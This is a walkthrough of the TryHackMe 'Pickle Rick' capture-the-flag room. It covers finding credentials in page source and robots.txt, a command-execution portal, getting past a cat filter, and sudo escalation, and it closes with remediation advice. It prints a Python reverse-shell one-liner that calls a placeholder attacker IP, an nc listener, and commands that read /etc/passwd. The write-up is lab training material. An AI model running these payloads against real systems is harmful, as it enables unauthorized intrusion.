<div align="center">

## 🎪 Pickle Rick: A CTF Adventure

![Badge](https://img.shields.io/badge/TryHackMe-Pickle%20Rick-ff6b00?style=for-the-badge&logo=tryhackme&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web%20Exploitation%20--%20CTF-blue?style=for-the-badge)

### 🚀 Challenge Objective

*Transform Rick back from a pickle by discovering three secret ingredients hidden within a vulnerable web application!*

---

### ⚡ Key Techniques & Vulnerabilities Demonstrated

```
┌─────────────────────────────────────────┐
│  ✓ Directory Brute-Forcing              │
│  ✓ Source Code Analysis                 │
│  ✓ Authentication Bypass                │
│  ✓ Remote Command Execution (RCE)       │
│  ✓ Command Filtering Bypass             │
│  ✓ File System Traversal                │
│  ✓ Privilege Escalation (Sudo)          │
│  ✓ Reverse Shell Acquisition            │
└─────────────────────────────────────────┘
```

</div>

---

# 🖥️ Complete Step-by-Step Walkthrough

> *A Rick and Morty-themed capture-the-flag challenge. Transform Rick back from a pickle by finding three secret ingredients!*

---

## 🎯 Question 1: What is the First Ingredient that Rick Needs?

### 📍 Reconnaissance & Discovery

After obtaining the target IP address, I opened it in a browser and discovered the initial landing page:

![homepage.png](homepage.png)

**Initial Approach:**
- 🔍 Performed directory brute-forcing to uncover hidden endpoints and clues
- 📄 Inspected the page source code for hidden comments and credentials

####  Username Discovery

Examining the HTML source code revealed a helpful comment:

```html
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

**Finding:** The username is **`R1ckRul3s`**

### 🛣️ Directory Brute-Force & Endpoint Discovery

Directory brute-forcing proved crucial for identifying the login endpoint. During this process, I discovered an interesting file:

**`robots.txt` Contents:**
```text
Wubbalubbadubdub
```

**Findings from Directory Enumeration:**
- `robots.txt` — Contains a suspicious string (potential password)
- `/login.php` — The login endpoint

### 🔓 Authentication & Access

Using the discovered credentials:
- **Username:** `R1ckRul3s`
- **Password:** `Wubbalubbadubdub` (from `robots.txt`)

I successfully logged in at the `/login.php` endpoint.

### ⚙️ Remote Command Execution Discovery

The login panel revealed a command execution interface at `/portal.php`. Testing with basic commands:

```bash
whoami
# Output: www-data
```

**Vulnerable Endpoint:** `/portal.php` (Allows arbitrary command execution as `www-data` user)

### 📂 Directory Listing & File Enumeration

Using `ls -la` to enumerate the current directory:

```bash
ls -la
```

**Directory Contents:**
```
.
..
Sup3rS3cretPickl3Ingred.txt
assets/
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

### ⚠️ Command Filtering Issue

Attempting to read files using `cat` command encountered filtering:

```bash
cat clue.txt
# Error: Custom error message (command filtered)
```

![error.png](error.png)

**Analysis:** The `cat` command is blocked by a filter, likely preventing direct file reading through the command interface.

### 🎯 File Access via Direct URL Access

Since `robots.txt` was accessible directly via HTTP (without command execution), I tested the same approach for other files:

**Direct URL Access Method:**
```
http://[TARGET-IP]/robots.txt
http://[TARGET-IP]/Sup3rS3cretPickl3Ingred.txt
```

✅ **Success!** The file `Sup3rS3cretPickl3Ingred.txt` was accessible via direct URL and contained the first ingredient answer.

---

## 🎯 Question 2: What is the Second Ingredient in Rick's Potion?

### 📋 Clue Discovery

Accessing the clue file via direct URL:

```
http://[TARGET-IP]/clue.txt
```

**Clue Content:**
```text
Look around the file system for the other ingredient.
```

**Interpretation:** The second ingredient is located somewhere within the file system, not in the web root.

### 🚫 File Access Restrictions

The portal command execution interface had multiple filters in place:
- `cat` — Blocked
- `vim` — Blocked
- `nano` — Blocked

Viewing the filtered message:

![rick.png](rick.png)

### 🔧 Alternative Command Discovery

**Solution:** Find an alternative file-reading tool installed on the system.

Listing available tools in `/usr/bin`:

```bash
ls /usr/bin
```

This revealed numerous tools. After analyzing the output, I identified that the `less` command was available and suitable for reading file contents.

**Testing the `less` command:**

```bash
less clue.txt
# Successfully displayed file contents!
```

✅ **Breakthrough:** The `less` command successfully bypassed the filtering!

### 🧭 File System Navigation

#### Current Working Directory

```bash
pwd
# Output: /var/www/html
```

#### Exploring the Root File System

Attempting to change directories using `cd`:

```bash
cd /
pwd
# Output: Still /var/www/html (cd was filtered/disabled)
```

**Workaround:** Use absolute paths with commands to explore the file system without relying on `cd`.

#### File System Reconnaissance

```bash
ls -lah /
```

This revealed the complete root directory structure, including the `/home` directory.

#### Target Directory Discovery

Exploring the `/home` directory:

```bash
ls -lah /home
```

Found a user directory: `rick`

#### Second Ingredient Location

The `/home/rick/` directory contained a suspicious file:

```bash
ls -lah /home/rick/
# Found: "second ingredients" (note the space in filename)
```

### 📖 Reading the Second Ingredient

Using the `less` command to read the file with the space in its name:

```bash
less /home/rick/second\ ingredients
```

✅ **Found:** The second ingredient was successfully extracted from this file.

---

## 🎯 Question 3: What is the Last and Final Ingredient?

### 🕵️ System Enumeration & Privilege Escalation

To access the final ingredient (likely in `/root/`), privilege escalation to root is necessary.

### 📊 System Information Gathering

**User and System Information:**

```bash
id
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

whoami
# Output: www-data

hostname
# Output: ip-10-48-164-33

uname -a
# Output: Linux ip-10-48-164-33 5.15.0-1064-aws #70~20.04.1-Ubuntu SMP Fri Jun 14 15:42:13 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

**Current User:** `www-data` (unprivileged web server user)

### 🔐 Sensitive File Analysis

#### `/etc/passwd` — User Enumeration Output

```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash landscape:x:103:105::/var/lib/landscape:/usr/sbin/nologin tss:x:112:119:TPM software stack,,,:/var/lib/tpm:/bin/false tcpdump:x:113:120::/nonexistent:/usr/sbin/nologin fwupd-refresh:x:114:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

**Key Users Identified:**
- `root` — Administrator account
- `ubuntu` — Regular system user
- `rick` — Secondary user (previously discovered)

#### `/etc/crontab` — Scheduled Task Analysis

```bash
# | | | | |

* * * * * user-name command to be executed
17 * * * * root cd / && run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

**Cron Jobs Analysis:**
```
# System maintenance tasks - no exploitable entries
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

**Conclusion:** No exploitable cron jobs found.

### 📝 Writable Directories Analysis

Identifying directories where the `www-data` user can write files:

```bash
find / -writable -type d 2>/dev/null
```

**Writable Locations:**
```
/tmp
/dev/shm
/var/tmp
/var/lib/php/sessions
/var/cache/apache2/mod_cache_disk
/run/lock
/home/rick (interesting!)
[and various other directories]
```

**Important Finding:** `/home/rick` is writable, indicating the web server has elevated permissions or a weak file permission configuration.

### 🔙 Reverse Shell Acquisition

#### Payload Construction

To gain full interactive access, I executed a Python reverse shell payload:

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR-IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

**Listener Setup (on attacker machine):**
```bash
nc -lvnp 4444
```

✅ **Result:** Obtained an interactive shell as `www-data`

### ⬆️ Privilege Escalation to Root

#### Sudo Privileges Check

```bash
sudo -l
```

**Output:**
```
Matching Defaults entries for root on ip-10-48-164-33:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on ip-10-48-164-33:
    (ALL : ALL) ALL
```

**Analysis:** The current user (or an authenticated user) can execute ANY command as root without restrictions.

#### Sudo Privilege Exploitation

With full sudo privileges (`(ALL : ALL) ALL`), gaining a root shell is straightforward:

```bash
sudo su
# Or alternatively:
sudo -i
```

✅ **Success:** Transitioned to root shell (`root@ip-10-48-164-33:#`)

###  Final Ingredient Retrieval

With root access, accessing the final ingredient file:

```bash
cat /root/3rd.txt
```

✅ **Found:** The third and final ingredient was successfully retrieved from `/root/3rd.txt`

---

## 📚 Key Learnings & Attack Chain Summary

### 🎓 Vulnerabilities Exploited

| # | Vulnerability | Impact | Severity |
|---|---|---|---|
| 1️⃣ | Hardcoded Credentials (robots.txt) | Direct Authentication Bypass | 🔴 Critical |
| 2️⃣ | Remote Command Execution (RCE) | Arbitrary Code Execution |  Critical |
| 3️⃣ | Insufficient Output Filtering | Command Execution Bypass | 🟠 High |
| 4️⃣ | Weak File Permissions | Unauthorized File Access | 🟠 High |
| 5️⃣ | Overly Permissive Sudo | Privilege Escalation | 🔴 Critical |

### 🔄 Attack Flow Visualization

```
┌──────────────────┐
│  Initial Recon   │  (Homepage enumeration + Source code analysis)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  Directory Scan  │  (robots.txt → password found)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  Authenticate    │  (Username: R1ckRul3s | Password: Wubbalubbadubdub)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  RCE Discovery   │  (/portal.php endpoint for command execution)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  Filter Bypass   │  (less command alternative to cat)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  File Exfil #1   │  (First ingredient via direct URL access)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  File System Nav │  (Traversal to /home/rick/)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  File Exfil #2   │  (Second ingredient from /home/rick/second\ ingredients)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  Reverse Shell   │  (Python payload for interactive access)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  Privilege Esc.  │  (sudo su → root shell)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  File Exfil #3   │  (Third ingredient from /root/3rd.txt)
└──────────────────┘
```

### 💡 Key Insights

**1. Defense in Depth Failures:**
- Multiple layers of security were compromised through poor configuration
- Weak credentials + RCE vulnerability = Complete system compromise
- Overly permissive sudo rules eliminated the need for SUID exploitation

**2. Important Command Filtering Bypass Techniques:**
- Identify blocked commands early (`cat`, `vim`, `nano`)
- Enumerate available alternatives (`less`, `head`, `tail`, `strings`)
- Test alternatives before proceeding

**3. File System Traversal Without cd:**
- Use absolute paths with commands: `ls -la /path/to/directory`
- Can bypass `cd` restrictions through this method
- Effective for accessing protected directories from restricted shells

**4. Privilege Escalation Windows:**
- Always check `sudo -l` for dangerous configurations
- `(ALL : ALL) ALL` is extremely dangerous — allows root command execution
- Even without specific SUID binaries, full sudo access guarantees root

### 🛡️ Remediation Recommendations

For system administrators protecting against similar attacks:

```markdown
✅ FIXES TO IMPLEMENT:

1. Secure Credential Management
   - Never hardcode credentials in robots.txt or comments
   - Use environment variables or secure vaults
   - Remove verbose comments from HTML/code

2. Input Validation & Output Filtering
   - Implement comprehensive command filtering/whitelisting
   - Use parameterized execution instead of shell commands
   - Escape special characters and dangerous keywords

3. Principle of Least Privilege
   - Restrict sudo access granularly
   - Avoid (ALL : ALL) ALL configurations
   - Use role-based access control (RBAC)

4. File Permissions
   - Ensure sensitive directories have restrictive permissions
   - Home directories should not be writable by web server
   - Regular audits of permission configurations

5. Web Application Hardening
   - Disable/remove unnecessary file access endpoints
   - Implement proper authentication and authorization
   - Use security headers and CSP policies
```

---

## ✨ Additional Resources & Tools Used

### 📖 Tools Employed

| Tool | Purpose | Command Example |
|---|---|---|
| **Gobuster** / **Dirb** | Directory Brute-Forcing | `gobuster dir -u http://target -w wordlist.txt` |
| **curl** | Direct URL Access | `curl http://target/file.txt` |
| **nc** / **Netcat** | Reverse Shell Listener | `nc -lvnp 4444` |
| **Python3** | Reverse Shell Payload | `python3 -c 'import socket,os,pty...'` |
| **less** | File Reading (Bypass) | `less /path/to/file` |
| **sudo** | Privilege Escalation | `sudo su` → root shell |

### 🎯 Lessons for Aspiring Security Professionals

1. **Enumeration is Key** — Thorough reconnaissance reveals configuration weaknesses
2. **Think Creatively** — When direct approaches fail, find alternative tools/methods
3. **Privilege Escalation Chain** — RCE + Weak Perms = Full Compromise
4. **Defense in Depth Matters** — Single failures at each layer compound into total compromise

---

## 🎬 Room Statistics

```
Room Name:          Pickle Rick
Category:           CTF / Web Exploitation
Difficulty:         🟢 Easy
Time to Complete:   ~45-60 minutes
Techniques:         7+ Attack Vectors
Ingredients Found:  3️⃣ (100% Completion)
Status:             ✅ PWNED!
```

---

<div align="center">

### 🚀 Keep Hacking, Keep Learning!

![Badge](https://img.shields.io/badge/CTF-Completed-brightgreen?style=for-the-badge)
![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-ff6b00?style=for-the-badge)
![Ethical Hacking](https://img.shields.io/badge/Ethical-Hacking-blue?style=for-the-badge)

*Remember: Always practice on authorized systems. Unauthorized hacking is illegal.* 🛡️

</div>
